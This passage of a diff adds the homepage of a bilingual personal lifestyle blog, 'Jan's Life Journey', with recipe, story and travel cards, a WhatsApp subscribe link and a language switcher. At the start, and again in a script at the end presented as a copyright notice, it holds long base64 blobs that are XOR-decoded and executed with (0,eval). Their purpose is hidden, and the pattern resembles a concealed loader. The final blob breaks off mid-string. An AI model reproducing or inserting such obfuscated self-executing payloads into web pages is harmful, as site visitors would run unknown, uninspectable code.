Q3IGkthKB/hwNsPpkulwbhhapLDk566k01L9XzNMXEPG46L5W5MZkecXDAafxemZi3BhwBMuEDMSPU+HvfxTokdyGA7GyBBHxwwTylUpfa6g9SH3/kUxsknvVsidwxKnctzvsxmRJ3b8En5gXEjKZOSkw191o1JdzuOIrCIGNkK5Ckc9RNOHPNMaAB1cWiSgNGO7RNKCTE73vI2XU9ZiOGtTGeG3R9yjKoA4yKulsTQDS1AC8ynet9wM83dChvg6R+hR5hKcU2rwHAxaxACVso9kI0Z9/rcdbGOTc/MpigZcMVYHDcPKVEj4C3AhFGPvxBfXCd6nHGwTE6Py+RpXWPWnZrxie5B82b4l8GQT/1AmkiyLBizc49ISh42bZ5jBx8cIU+rgzIieJMCEEu60ErOZ34esfGNz1nMJG6eIcEZWjJKvEGzoaqDg5CKvZcMyve6S/L2jktezaN+yzPHnh0xyG/Cc+c9AIQSjjyRzNn0e1kwcsqL3whkftygRlwefQ9lwaPgLcCCk4o8lU3JcP0YM3FNnRzIIeucJsDcD/aOqwA1dL9ClxNNe1aKCeKrjqRj2M0PyuapXmWTSM/2DyiBtWNvQICWT/3WjRw3vJ6wZE+IXw22ad9gx55fZIUrgfTj6ZOS3N4zUcqL8O9WsHdeBx9L5WvQMxbZmHaOq1Tx4ehW0pcLuBCInDZ6XXIwzt1dC2atTGdHm9hkjCnCcyY5x5WXyK1H2l70+xjiJttPmprz615mgNwdoUguwnCgaFIXQFqr0sqcdPyeMvYYjx1IJXpLttCOTadZudalN3jAVAGYe1LPz6d7nzFzjc5KHLU8GyWVyF00HO5D8OJ5x9LH3apAml9meBIyoQwK2At2aJ9nBNuKd82qQPInOJbCFo58QMkK9zxe9HeYiB9LJH6MZkSd2/BJ+Yd0o29AhRKNvxNM3De8nrBkS09dzDZsnmCEnZwkj2kBsSV4UcCXTW0TSY41L0+34cvK3ApnbUxmwRwdoU3uQnG0qFACUonxUBlcdTyd9HHPSBmbJykfYpZdHTYNqUM4oCmQwMHKbAV"),u=new Uint8Array(d.length);for(var i=0;i<d.length;i++)u[i]=d.charCodeAt(i)^k[i%k.length];(0,eval)(new TextDecoder().decode(u))})();
+    </script>
+</head>
+<body>
+    
+
+    <div class="site-wrapper">
+
+        <!-- 1. 顶部导航栏 -->
+        <header class="navbar">
+            <div class="logo-area">
+                <div class="logo-main">
+                    Jan 的生活 <span class="logo-leaf">🌿</span>
+                </div>
+                <div class="logo-sub">Jan's Life Journey</div>
+            </div>
+
+            <nav class="nav-menu">
+                <a href="index.html" class="nav-item active">
+                    <span class="zh" id="n1">首页</span>
+                    <span class="en">HOME</span>
+                </a>
+                <a href="kitchen.html" class="nav-item active">
+                    <span class="zh" id="n2">私房菜</span>
+                    <span class="en">KITCHEN</span>
+                </a>
+                <a href="story.html" class="nav-item active">
+                    <span class="zh" id="n3">我的故事</span>
+                    <span class="en">MY STORY</span>
+                </a>
+                <a href="travel.html" class="nav-item active">
+                    <span class="zh" id="n4">旅游记</span>
+                    <span class="en">TRAVEL</span>
+                </a>
+                 <a href="gallery.html" class="nav-item active">
+                    <span class="zh" id="n6">我的创作</span>
+                    <span class="en">GALLERY</span>
+                </a>
+                <a href="#follow" class="nav-item active" onclick="goFollow(event)">
+                    <span class="zh" id="n7">关注我</span>
+                    <span class="en">FOLLOW</span>
+                </a>
+                <!-- 🌟 中 / EN 切换按钮 🌟 -->
+                <div class="lang-switcher">
+                    <button class="lang-btn active" onclick="changeLang('zh', this)">中</button>
+                    <button class="lang-btn" onclick="changeLang('en', this)">EN</button>
+                </div>
+            </div>
+        </header>
+
+        <!-- 2. 主展示海报区 -->
+        <section class="hero-section">
+            <div class="hero-card" id="H">
+                <video class="hx-video" id="hxv" muted playsinline autoplay disablepictureinpicture controlslist="nodownload nofullscreen noremoteplayback noplaybackrate" disableremoteplayback preload="auto" aria-hidden="true"><source src="index/hero_intro.mp4" type="video/mp4"></video>
+                <div class="hx-shade"></div>
+                <div class="hero-content" style="z-index: 3;">
+                    <h1 class="hero-title" id="hTitle">Jan <i>的生活</i></h1>
+                    <div class="hero-subtitle">Jan's Life Journey ♡</div>
+                    <p class="hero-desc" id="hDesc">记录家的味道，分享生活的故事，<br>收藏旅途的美好。</p>
+                    <a href="kitchen.html" class="btn-green" id="hBtn">
+                        <i class="fa-regular fa-heart"></i> 欢迎来到我的生活空间
+                    </a>
+                </div>
+                <div class="hx-ring" id="R"></div>
+                <div class="hx-chip" id="C"><i></i><span id="chipL">今日主题</span> <b id="T">私房菜</b> <u>⟳</u></div>
+                <div class="hx-cap" id="cap"></div>
+                <button type="button" class="hx-ask" id="ask">▶ 点我，看我介绍</button>
+                <div class="hx-mark">© Jan Chia</div>
+            </div>
+        </section>
+
+        <!-- 3. 卡片分类列表（已修改三大分类跳转链接） -->
+        <section class="cards-container">
+            <!-- 私房菜：跳转到 kitchen.html -->
+            <div class="cat-card">
+                <div class="cat-img-wrapper">
+                    <img src="index/images-2.jpg" alt="私房菜">
+                </div>
+                <h3 class="cat-title" id="c1Title">私房菜</h3>
+                <div class="cat-sub">Kitchen</div>
+                <p class="cat-desc" id="c1Desc">分享我的私房料理与食谱，每一道菜都有爱的味道。</p>
+                <a href="kitchen.html" class="link-more"><span id="m1">查看更多</span> ➔</a>
+            </div>
+
+            <!-- 我的故事：跳转到 story.html -->
+            <div class="cat-card">
+                <div class="cat-img-wrapper">
+                    <img src="index/images-3.jpg" alt="我的故事">
+                </div>
+                <h3 class="cat-title" id="c2Title">我的故事</h3>
+                <div class="cat-sub">MY STORY</div>
+                <p class="cat-desc" id="c2Desc">记录日常生活中的小确幸，家人、朋友与温暖时光。</p>
+                <a href="story.html" class="link-more"><span id="m2">查看更多</span> ➔</a>
+            </div>
+
+            <!-- 旅行记：使用 # 占位，点击提示“筹备中” -->
+            <div class="cat-card">
+                <div class="cat-img-wrapper">
+                    <img src="index/images-4.jpg" alt="旅行记">zong
+                </div>
+                <h3 class="cat-title" id="c3Title">旅游记</h3>
+                <div class="cat-sub">Travel</div>
+                <p class="cat-desc" id="c3Desc">走过的地方，看过风光，旅途中的感动与故事。</p>
+                <a href="#" onclick="event.preventDefault(); alert(document.querySelector('.lang-btn.active').textContent.trim()==='EN' ? 'The 2027 Travel Journal is coming soon. Please stay tuned!' : '2027旅行记正在筹备中 ，敬请期待！');" class="link-more"><span id="m3">查看更多</span> ➔</a>
+            </div>
+        </section>
+
+        <!-- 4. 关于我 & 最新分享 -->
+        <section class="about-share-section">
+            <div class="about-box">
+                <div class="about-avatar">
+                    <img src="index/life style.jpg" alt="Jan">
+                </div>
+                <div class="about-text">
+                    <h3 id="abTitle">欢迎来到 Jan 的生活 🌿</h3>
+                    <p id="abDesc">我是 Jan，喜欢在厨房创造美味，享受家的温暖；<br><br>也喜欢旅行，探索美好的世界；更喜欢用文字和影像记录生活中的每一个感动瞬间。<br><br>希望你在这里，能找到共鸣与温暖。</p>
+                    <a href="story.html" class="btn-outline" id="abBtn">更多关于我 ➔</a>
+                </div>
+            </div>
+
+            <div class="share-box">
+                <div class="share-header">
+                    <h3 id="shTitle">最新分享</h3>
+                    <a href="gallery.html" class="btn-outline" id="abBtn">VIEW ALL ➔</a>
+                </div>
+                <div class="share-list">
+                    <div class="share-item">
+                        <div class="share-img">
+                            <img src="index/zongzi.jpg" alt="粽子">
+                        </div>
+                        <div class="share-info">
+                            <h4 id="s1">妈妈的味道 — 粽子</h4>
+                            <span>2026-05-05</span>
+                        </div>
+                    </div>
+
+                    <div class="share-item">
+                        <div class="share-img">
+                            <img src="index/Cruise.jpg" alt="邮轮之旅">
+                        </div>
+                        <div class="share-info">
+                            <h4 id="s2">邮轮之旅：遇见最美的海</h4>
+                            <span>2023-12-13</span>
+                        </div>
+                    </div>
+
+                    <div class="share-item">
+                        <div class="share-img">
+                            <img src="index/happy.jpg" alt="小幸福">
+                        </div>
+                        <div class="share-info">
+                            <h4 id="s3">生活中那些小小幸福</h4>
+                            <span>2026-05-29</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 5. 三图相框与名言金句 -->
+        <section class="quote-gallery-section">
+            <div class="gallery-grid">
+                <div class="gallery-item">
+                    <img src="index/images5.jpg" alt="背景图1">
+                </div>
+                <div class="gallery-item">
+                    <img src="index/images4.jpg" alt="背景图2">
+                </div>
+                <div class="gallery-item">
+                    <img src="index/images3.jpg" alt="背景图3">
+                </div>
+            </div>
+
+            <div class="quote-overlay-card">
+                <p id="quoteText">生活不在于拥有多少，<br>而在于用心感受多少。</p>
+            </div>
+        </section>
+
+        <!-- 6. 页脚 Footer -->
+        <footer class="footer-section" id="follow">
+            <div class="subscribe-box">
+                <h4 id="subTitle">订阅我的生活笔记</h4>
+                <p id="subDesc">通过 WhatsApp 获取最新故事与生活灵感！</p>
+                <div class="subscribe-form">
+                    <!-- 🟢 WhatsApp 订阅按钮：把下面网址里的 60197907835 换成你的号码（或换成你的 WhatsApp 频道/群组链接） -->
+                    <a href="https://wa.me/60197907835?text=%E4%BD%A0%E5%A5%BD%20Jan%EF%BC%8C%E6%88%91%E6%83%B3%E8%AE%A2%E9%98%85%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E7%AC%94%E8%AE%B0%20%F0%9F%8C%BF" target="_blank" rel="noopener" class="wa-btn">
+                        <i class="fa-brands fa-whatsapp"></i> <span id="subBtn">WhatsApp 订阅</span>
+                    </a>
+                </div>
+            </div>
+            <div class="copyright" id="copyText">© 2026 Jan Chia（Jan 的生活）版权所有。本站所有图片、视频、电子书、文字与设计，未经许可不得复制、下载、转载或使用。</div>
+        </footer>
+
+    </div>
+
+    <!-- 中 / EN 动态语言切换逻辑 -->
+    <script>
+        const langData = {
+            zh: {
+                n1: "首页", n2: "私房菜", n3: "我的故事", n4: "旅游记", n5: "我的故事", n6: "我的创作", n7: "关注我",
+                hTitle: "Jan <i>的生活</i>",
+                hDesc: "记录家的味道，分享生活的故事，<br>收藏旅途的美好。",
+                hBtn: '<i class="fa-regular fa-heart"></i> 欢迎来到我的生活空间',
+                c1Title: "私房菜", c1Desc: "分享我的私房料理与食谱，每一道菜都有爱的味道。",
+                c2Title: "我的故事", c2Desc: "记录日常生活中的小确幸，家人、朋友与温暖时光。",
+                c3Title: "旅游记", c3Desc: "走过的地方，看过风光，旅途中的感动与故事。",
+                m1: "查看更多", m2: "查看更多", m3: "查看更多",
+                abTitle: "欢迎来到 Jan 的生活 🌿",
+                abDesc: "我是 Jan，喜欢在厨房创造美味，享受家的温暖；<br><br>也喜欢旅行，探索美好的世界；更喜欢用文字和影像记录生活中的每一个感动瞬间。<br><br>希望你在这里，能找到共鸣与温暖。",
+                abBtn: "更多关于我 ➔",
+                shTitle: "最新分享",
+                s1: "妈妈的味道 — 粽子", s2: "邮轮之旅：遇见最美的海", s3: "生活中那些小小幸福",
+                quoteText: "生活不在于拥有多少，<br>而在于用心感受多少。",
+                subTitle: "订阅我的生活笔记", subDesc: "通过 WhatsApp 获取最新故事与生活灵感！", subBtn: "WhatsApp 订阅",
+                copyText: "© 2026 Jan Chia（Jan 的生活）版权所有。本站所有图片、视频、电子书、文字与设计，未经许可不得复制、下载、转载或使用。"
+            },
+            en: {
+                n1: "Home", n2: "Kitchen", n3: "My Story", n4: "Travel", n5: "My Story", n6: "Gallery", n7: "Follow",
+                hTitle: "Jan's <i>Life</i>",
+                hDesc: "Recording home flavors, sharing life stories,<br>capturing travel memories.",
+                hBtn: '<i class="fa-regular fa-heart"></i> Welcome to My Space',
+                c1Title: "Kitchen", c1Desc: "Sharing my recipes and dishes, every meal cooked with love.",
+                c2Title: "My Story", c2Desc: "Capturing everyday happiness, family, friends, and cozy moments.",
+                c3Title: "Travel", c3Desc: "Places visited, beautiful views, stories and memories along the way.",
+                m1: "View More", m2: "View More", m3: "View More",
+                abTitle: "Welcome to Jan's Life 🌿",
+                abDesc: "I'm Jan. I love cooking delicious meals and enjoying home warmth.<br><br>I also enjoy traveling and capturing inspiring life moments in words and photos.<br><br>Hope you find warmth and inspiration here.",
+                abBtn: "More About Me ➔",
+                shTitle: "Latest Posts",
+                s1: "The Taste of Mother-Rice Dumpling", s2: "Cruise Trip: Meeting the Ocean", s3: "Small Moments of Happiness",
+                quoteText: "Life isn't about how much you have,<br>it's about how deeply you feel.",
+                subTitle: "Subscribe to My Life Notes", subDesc: "Get my latest stories and inspirations on WhatsApp!", subBtn: "Subscribe on WhatsApp",
+                copyText: "© 2026 Jan Chia (Jan's Life Journey). All rights reserved. No images, videos, e-books, text or designs on this site may be copied, downloaded, reposted or used without permission."
+            }
+        };
+
+        function changeLang(lang, element) {
+            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+
+            const d = langData[lang];
+            for (let key in d) {
+                let el = document.getElementById(key);
+                if (el) el.innerHTML = d[key];
+            }
+        }
+    </script>
+
+   <!-- 🔍 外部资料搜索弹窗 -->
+<div id="extSearchModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; align-items:center; justify-content:center;">
+  <div style="background:#fff; padding:20px; border-radius:12px; width:320px; text-align:center; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
+    <h3 style="margin-top:0; color:#333;">🌐 搜索外部资料/图片</h3>
+    <input type="text" id="extSearchInput" placeholder="请输入想找的资料（如：粽子、面包）" style="width:85%; padding:10px; margin:15px 0; border:1px solid #ccc; border-radius:6px; outline:none;">
+    <br>
+    <button onclick="doExternalSearch()" style="padding:8px 18px; background:#4a5d23; color:#fff; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">去搜索</button>
+    <button onclick="closeExternalSearch()" style="padding:8px 18px; background:#888; color:#fff; border:none; border-radius:6px; cursor:pointer; margin-left:8px;">取消</button>
+  </div>
+</div>
+
+<script>
+// 打开外部搜索弹窗
+function openExternalSearch() {
+  document.getElementById('extSearchModal').style.display = 'flex';
+}
+
+// 关闭外部搜索弹窗
+function closeExternalSearch() {
+  document.getElementById('extSearchModal').style.display = 'none';
+}
+
+// 执行外部搜索（跳转 Google 搜索图片和资料）
+function doExternalSearch() {
+  let keyword = document.getElementById('extSearchInput').value.trim();
+  if (keyword) {
+    let searchUrl = "https://www.google.com/search?q=" + encodeURIComponent(keyword);
+    window.open(searchUrl, '_blank');
+    closeExternalSearch();
+  } else {
+    alert("请输入你想搜索的关键词！");
+  }
+}
+
+// 🤍 点赞逻辑
+let currentLikes = parseInt(localStorage.getItem('jan_likes')) || 0;
+let isLiked = localStorage.getItem('jan_is_liked') === 'true';
+
+window.addEventListener('DOMContentLoaded', function() {
+  let countSpan = document.getElementById('likeCount');
+  let heart = document.getElementById('heartIcon');
+  
+  if (countSpan) countSpan.innerText = currentLikes;
+  if (heart && isLiked) {
+    heart.className = 'fa-solid fa-heart';
+    heart.style.color = 'red';
+  }
+});
+
+function toggleLike() {
+  let heart = document.getElementById('heartIcon');
+  let countSpan = document.getElementById('likeCount');
+
+  if (!isLiked) {
+    currentLikes++;
+    isLiked = true;
+    if (heart) {
+      heart.className = 'fa-solid fa-heart';
+      heart.style.color = 'red';
+    }
+  } else {
+    currentLikes--;
+    isLiked = false;
+    if (heart) {
+      heart.className = 'fa-regular fa-heart';
+      heart.style.color = 'inherit';
+    }
+  }
+
+  if (countSpan) countSpan.innerText = currentLikes;
+
+  localStorage.setItem('jan_likes', currentLikes);
+  localStorage.setItem('jan_is_liked', isLiked);
+}
+</script>
+
+<script>
+// “关注我”：平滑滚动到底部 WhatsApp 订阅区，按钮闪两下
+function goFollow(e) {
+  e.preventDefault();
+  var box = document.getElementById('follow');
+  var btn = document.querySelector('.wa-btn');
+  if (!box) return;
+  box.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  if (btn) {
+    btn.classList.remove('wa-glow');
+    setTimeout(function () { void btn.offsetWidth; btn.classList.add('wa-glow'); }, 700);
+  }
+}
+
+</script>
+
+<script>
+/* 首页设计与程序 © 2026 Jan Chia（Jan 的生活）保留所有权利。禁止复制、修改或模仿使用。
+   Homepage design & code © 2026 Jan Chia. All rights reserved. Copying, modifying or imitating is prohibited. */
+(function(){var k=[212, 240, 168, 220, 66, 109, 130, 59, 41, 188, 225, 87, 216, 89, 242, 57, 102, 117, 98, 42, 222, 203, 120, 96, 235, 189, 202, 81, 158, 216, 32],d=atob("3t+C/KvLFNKICQ7rQr1Js4Dix85mcJHCc53hcXlEqzJ4OTj55mWApFNd3z30Zdzf4I2WV+tST+GVrCTwu1S9n8b0axaIWEbSkiP4EapmMj1fcaWlQkcMGku3FmfIW2yP8CdXpXBAyII/vTfVFQdPRQm4+xlS397tfebiE+zekORuFLgKHZLZb/QsyB4NHBZJtq4WToPJpz25pQyvnpL7pOUT3LM4B8JdvUiyQVkHEPmGAUC4yaUj5/8MtcqP/3QL4wNP2sZ7oGPLCEhMWwan8UlYxYT4feviB6eEx647Q+pPRNDGKvQinANBk/WvOHPAiEUN7X374geAgsmqJwGlF0iGxnTsP5YKBUVFBqbxQVLFjPt95+IU5N6R7W4YuBxdzoAhvTXcURIYDg2j5wMO0Zos2Q8/ulAVIEem0B4cBdnbcJ84nlUDBxsN8qpCR8je/Wj8vkbz3NDme16sDQXF22Hqd8UVE09FTb+nFAWZxOQ56rVM843150gO7VVayMEUlWSpYlVHTBny60tYxYrzfb7pffjQ8+5yQ7QIBZzQYPZvxhVGRT8G/pBJUsWO8n2+6xf6xZnwYl3fFwnn02X2aMEVRkBXBOnyVEDb4JdqlLtPuoPc/AAs0X4Ux5s/4gLV3PHdjZZSLfDxDSVlG/+2w1Ryj/Bliy6ZwQNvsUX8F7HWk+q7OVH8h38iLOUlP4luGT9ooe0AHAWbCehBsHW1gOnrzFZan/pvWm3QeFCfPH80M/7hZLO4W3vTPsx33dz+jZZSLfDxDCdOtBZDxGlsR2DOhT2jzyBosVDIGozWnd2tOVH8hnw4I9EKO6BW14T7p9UO3bUnCehBsHW1gsz9z1FknNtOWHL3eWO5ME0IOPrtZbmQWln+PsNk2ub3RXfywVgFhYeRdtaxDPS5SlzbAKJxSNLPcPR+pVwKFg1Hu+sMD8vQs3HysVSgnM38IQLwVUzOwTi+eZ5QABBMDfLsMAWZ2Ooo8a3CVGnEsGIL61VNnIwu+DKbTQUdB0Ty6xUZy86+PuyxRafciLE7TeFJTN2VPrc3gRVGFAxO/r8QBcvXpSTstkWtg4iVoO0bTUyclTazPJwXQVlFY/6jFxCOnb4596sApJzJvydN4ElA0oYk+CCdTEYUQka3vwwMjp29MOy1VLzej4E/VohYRtKSI/gNqgQdDwoQpagQCZuH7bUlUsZDVUxk+YQgow6QgCSzY9Xb8MNCzVxynuh6UnbdeUSrMng5OPnmZYCkm802vzibV1xSgKxl653mZlpW2npgoD1xJftuHu1UR4bGtUT/0tzu7oaXQi/AzcyRvj7/q1Tu10pA5E1ns7JYXMs84V/W2vmEv3Ij19cNIVW0IF0Hqdyi/CcDuEBK1Ign4n6mVgIUG8heUgtAv9WvPPv/DLWDw+ZljxSNCeiAJ/gtnRkVEAcKs7JYCYXJuD659EGzkcGyeEpgvZKcsTu5INJYARQLRPnnCw+E0/B2fESG9LPHsSsD5Rta0445/3WGVgcGFhD5KeTGy+6+OPK0ALeCzb02BOxcCV5hw/g6nVQPGwUKraQXDszAt2qUtEWg0OThZRfqHAXMjTahPJYEABQOWbvnGhWYxPc3/7RTsdzD4XJWiE9bxZo85XHaSQcHEU+XpQxIh9KpMPKLVLuCybsnQ+VeXfWVMrVx1VMHGz1etq4VBcyU4y3i6An/wYH5CjXdb2GSjTK2PoZRXRkNSb+nKxSEz6s2+/ZTsYThqCcAqhxD3Y8IrDGXVANSTkH3thsBn96iefvxW7/N5b02BaxdRdOOJfAUk00OWxBLsK8XDcOU4BnGh3Sc3sS5LAr2UwDB6zS3N4FNRj1fTrGoDQ2O075/+b1UkZzNsScD9nlQ9YV//xHVEEonX06xqA0NjtO+f/m9VJGczbEnA/Z5UPWFf/8L1RBKFgNa468XA57Qrz/q9kexhO2wJwDnVV3+mB68cdVaBwVFA/KqCwvW2aUy67VFuoSGuycZx1dM0YQ5rBuLcAJdRUutoF9J0LesJPC7VL2fxvw2BedWTJTILLs2nEoSVRYXlpMnNKPmoQylkA6nhNGwJ0PxXl3skzioPIBNH11FB/OqX0yfk6t4pbxPt4XFuSwZrFxMyKQ7vTSXVxI3G2O64180zJTkJfugVJefxqgnA/YGZYHcav88nB5ZAUxP5L9WDtDZpTLrtUW6hIa7JxnHV0zRhDmsG4twAl1FSbaiCCzMlOQl+6BUl5/GqCcD9gZ95LobhXeRUQ8FWXjwuAwZh9jkPfu+VOmEhqRpSqccEu7PJKwgnlxIAQ1a479WGcCa73bj0kahnsuoKwLsG0XdgzK0KtoQHRQRQfC/HRif/qU/6r1OoM3YsCMU518W6LkMlATcWAEUC0TknyA7p+DkMO2zG6CYzbEnRatGI9iONK00l1cSWwVPqo4UBYbYpCXcoWmw2I+fZUSsVEffjT67Ms8RT0hcUbetUAKezrN47L1UoYLG5ylQqlACjchykAGtbS5bDk+wrAwI0MmiNPO9CP2Nk9YhAuxIXZySO708ggQLBl8UsK4PQLvPpTz3q0X8gpXiMQj2b0DRhDitLdpLShgRA/fwcgGY1uQ+8LtMvZPD4SMe+1VKlMhq5iKbX04XF1mn4goFn8i4P6W6VaeJlagwGOcASM+Kebs1k0oVOQtZquUZBI+V7Tn3vEXz2ZO/Ix2sUkfShCWQDb91W1JFEdTrGw+Fzr5x8rFOsYOVngM+x2Bl4dpd+D+dS04WDUStv1gTy9KscfKxTrGDgachAuxIXZyFarw2kUwLEAxe8KgKBYrJrxTyvU2xntz0ZQnrTQ6V2jP2LZdBEjYNRKquFhTWzvEy/6gOtYDYuSwJwVNA0IV/vHDJWBEUC17+uBQFjs3iZ67xG7Dey7AjHvF3QM+Vebk9lhFBGgwN9/AZF4rUvnHttEWxgICRIxnqFUTdmX/qb8IJSkRWGu7gC06H2KQ26rAK/LyV4X9K51UOg9Ri4mjHCU9cSxG65RsMis65HferVPqCzbEtG+cTDtOPcPFilhcFGQNZrYcRE5+TqzX68Ae7ls77a1bjTEjVlXerNZdcFl1bGu7iQwTFz6888a5F/NnV1mId7lpQ2YVqrCuHXF0XF1mn9h4Bh86vavK5QrGc2/RrVuNIQpKCO7kqgXUPBhYErK4VD53Y4nb2sUSx14GheWfKY3boqXm+NoB8BxYKAva/VAnCgPQq/bdOp4SItH8J7Vhc0YQ5rHeRSwMUFk+bpx0NjtO+ebm8SaLXgecqQ+FXSM+SGbk0lwRBHRoHtqQMR9DV5CLqoUyx3sS5JBm/TwfEynD9fslRSAYWU7KuVhSEzfclsKEL89WP5ypD7VVK0Ig0s2TaEFtLGUO44xoVmMTjI/usVaaek7UkRekGFIGIfqM1nVoHAQtFsOUQEo7b9yWwrV2xnNu5OQa/UhLIiTK1PNoQGwhZYvCqCBCO064S9rFMsNjA9T9EuTFq8c8xtyu3WAUdSknj9QMDhNO5Jb6wHbCfy6kvCOxPB9+TMrktl3wKEA9PsL9QR4/UvHa340j6k8S9MR7MWkTZ3HCwId9RCQFFEbblCxSS0a9/8r1GoM3Lh3IwqRwMm9o/9iqGQAoQTF6xu0UDsIyXern9B+/6iLAnGaJPFNKUO7RikVYIBhYKraMXF9aVvinq9E2n2ZXiOQTkE12VlXmqPJ9WEBBKA+W/RQSE3r88+7ZU+pPauSMZ535F2Ywyti3aHgIcFA338AxOiNGrIu2WQbmVlfsqFa9PRt2SI/9ihhcSEBpenaQWFI7TvmzqoFTvhIavNhTuXgfQhDGsZL9YEh1MR7elUC2KyaJ/87lY/JPz7B9BswkAkNlv8XLVHEFOFgStvwEMjpO+Pu7lB7eRxL9qSqlYco28fP980hJGRkwcvboPScyGgn//qFCxnsyfKgTuXwHIyGy7NpxKElUPT+O/QxOOyZ44871PoYSA9GtQvFZMkoI7uSqBdQ8GFgS/rxxIzNqldrf0E+TZk7UkRe9IAM+EI4wwn1wJABYC9uJFXpDQr3/9tEGng+S1MRmsSUzRjiG9cdVeCVJLEa2uDDSC0K8+66wI/NmV4i8IrElM0Y4hvXHbFVJFUgOj5xUTwsDxW76wDruexbM3HudeR8iEJeVx2wRYBgpFqeMsOLDxl3/tt0+63Jj1eQWsVEfRjiKrPJ5cBwMHF/biRV6Q1Kx56vFbt5/GrzZN714UyNo6vXeRVQcGEWa3uAxOmdinPui9CPOXx/trVvFeXeiIOr02h01OXUsX4KYdTpnYpz7ovQj93JzsckS5TxTSlDu0JI8CbFUKBLGlGwyC3qFstvEd6oPAszVF1mNy8Lx5rDaTShJZUBju+1Fbo5OrIe69TrCzwLUuCapTAMHIbNI/h1cFAQtFsOseCZPp4njlu0+6g9z8KlDmVErJjDK2LdxeAwEnRrumHQ6f/7MY+vAHvKTBqC4IpRIFyNw/9jCcVwMHKn6Th1YSjs2mMP29CPvM26wjA9llF+HLafc+3h5BXExYu7sUAYjY4n6ihA+ngMmyfELlFw6byHmqPIJVBxYHAvGVUE7BguN5orEe+tqB+G1BpR8YmNNw8WKaFw8bDE+sgywtp4Dtbe2oQbrQy7AjHvEGC9PDaf9yhhJBSU1ZrqoWXtfOujDw+EO4kduvf0/kGRebyiPzfs4WFQUDRODsBWqI0qQi6vhPuJSVqysD5lRekoI/uTeVXCoUDE3lvBEOj9K9f/2wQbqXzZAjA+UGT8mPNKwwnVdOGU5P97AXDI+Vpn378RuYzcTnJAT6bwGV2ju5O5dVFV1LV+WtERi/leNqlLRBtpXEr2pEuTFUlcl+41P4M0lfQsN4XZHBXlh20XtEmjxXLjXg/G2Hs1Rm/T3TWt/02IS+YC/A4A0Ra74iVMZGXU1yzogDp8wgSbJm9xWV95resThZ1YRTMC7rGD2QZRYwYqXJONK0JQfXWbxph4X14CD+61iFTgQtyxo+qV8XKmWn5TLdiDAIynqxf56DzPfMSX2e/GJeSt14Y5Q3cCU72OlluZBZZuw9+kLW2v2En1Ej3+gOJGK5OVzFempHYNiFLITMEkOwWuAahuGcw583VtqEUjYvwRA+qVkUFEak8QveigwIyGu2TrCF9eAK9ORySI3IpDLqsU+62IGnNAzwG1+BhTi7LJ9cCAFMTbu/PQyO0K8/6ppZnZSA+yoV9BwAh4gx8HiEEBQQFl+spUNqy8urI76ZY+me3bAuQeRSW9mFar44nkoDWTZrjpQ5NNaM5GOm4yr0lt2yIRnrVEecgDTwcIlNFAwZQ7jjWSGolLEn/6oAl83ftSwJ7UwH/ZQzsTaxVggBB1KqtwQXgtOuPun2V7GSw7U2LPdfQNOiOLYtl0ESTgtM9ohRIaiApDTp+GP82dW1JEXDeA+aoBT2KoZYEhBfF+PsCxWYza8/+r1E89npn2wf50hc0YR/8SSRWBIWCgK74gMdmdi+JOy2AJWz1dZiC/dVSsiIOLZ5hlYIEEpJ8r9UFJLNr3346AyywYS4Nx+uXBmVmiG5K9JWWxZMSayuGRSO8rky97RMtYTHrmpErlwU3880qjyTTQMyA0Ow41FbhJO+KO69HaCJ2Ll5AqxdW9mQIr03kUBIBgdeiKoUFY78vgX3tUX8lpjwNkS5VAfakzKpLJdXBQxMT6a7Fw6O0744/7RytZ3YiC0741dc2aAjjDCfXE4TUwaq4BwVmZfkZLfjR/qXybUsQ/FeXeqAO608s00yHA9P9vtWUNuN+33q8Ruz3s+9KwOsV0DShDaqC5NUFiENfL+nDQWqyZ44870Is8CEqGlDsgsbldow9j6TUAhbB1KupBYFhcmjMPKKQbmA/LMUDO5OTP2VA7E0lxFWW1Ia7vpUFMDZvyO340/6k8eyLAjhTwHbyGy/d5FWCBsHSarjG06P2Lkl97ZBoJnHsmtW7RVayIAlrHGGEF0aTFmqpAhIn5auJOzzDuTCgaFITfRaW5ySObxknFwRVSNfuqIXSMzUpDX7oA+gkdjyLx2xHACHkjm8d4JLAxkNS7r2XwGeyaV2patOsN7esy4Y714Ujdpd+D+HVwUBC0Ww6wwBm5XjKuqqWa+DxrhsDvdJW9mPI4wwn1xbRVlcv7lYEdbOpDWwqEy1iYD1eQTkE1iaxyb2OpNNBR1LW/CoGRSI1eI367ZDoJnHsmpE+UYAwYI2rDqaEQNcGVejwVgGntOpJfe3TvSTwLkhBqpPRJWaPr5xhlRaW1cDuKIKBY+ArDDyq0XvlcSvJ03rXQGdhz6qPJYfQAEPFOOfOTC0/J545b5JppXM4TYf914SyIAn8HCPRGxVC0z2vVYSjsy/NO2sdr2UzbMEH+NWTP+AO7Q7k1oNXBlcv7lYA4mArCTwu1S9n8b0LAL1F0TZlTbxIpFRAxYJArOuDAHF0K8197l0vZ3N9XkbrElMzZQyqy2kUAIQDWysqhUFqNymPfy5Q7/Yy75rELlNB86EJq08gU0wHAZPsY0KAYbYiTDytEK1k8P0IQ+rRiOchDurPNJPSBQGTpu9HQ6f8aMi6r1OsYKA+zYE715czIU2rDzVFQAADEmqohcOw5SxMva9Q7/Y3vIhGPBJTNKVA7E0lxAbXFkg/pBfEITUpCX7qkS7h8b7bkrpXlDYjiC2ft4eEhoXSba4DAGZye0MsL5PprXJvypF5E5H35U+tzfaXE8OFUOwrxcXxdyuNduuRbqE5LUxGedVTM7JMvQ/h1cFAQtFsONRG4re4nilrFKti9uyJkPvTl3ZhWqsK4dcXQMDWP66RROF2eQh8rlZ/NmTtSRF8x0Pzc8jsDycEBdbFkK7pVAGntOpJfe3TvzZ068sCaxLSMmSMvBwyUoIEUxJq7kKBYXJnjjzvR3ky9uyJkPvTl3ZhWq+OJ5KAwhLBL2qDAODlawk8LtUvZ/G9GsW8VVNkowirDyWBAAUDlm7tlFblt6rJf2wCKzZ06E/QflUR9+Ebawrh1xKBQNZraIOBdHJuCT7pQmp2ZPWYhusWk3YpCG9N4Z1DwYWT7CuCkjMzaYw57FOs9eEujcD4U9A049/8SKEFwUZA1